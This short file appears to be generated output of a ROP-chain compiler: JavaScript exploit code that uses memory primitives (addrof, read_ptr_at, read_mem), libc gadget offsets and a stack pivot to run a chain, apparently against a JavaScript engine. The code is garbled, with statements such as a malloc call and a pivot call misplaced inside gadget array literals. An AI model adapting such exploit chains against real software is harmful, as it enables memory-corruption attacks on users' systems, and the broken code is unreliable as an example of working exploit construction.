Using ASM file: test.rop
Using Gadgets file: ../dumps/gadgets.txt
var ropchain_array = new Uint32Array(20);
var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
var ropchain_offset = 2;
set_gadgets([
var retbuf = malloc(8);,
libc_base+788575 //pop rax
]);
db([179, 0]); // 0xb3
set_gadgets([
libc_base+792472, //pop rcx
retbuf,
libc_base+350953, //mov [rcx], rax
pivot_addr,
pivot(ropchain);
print(read_mem(retbuf, 8));
]);
pivot(ropchain);
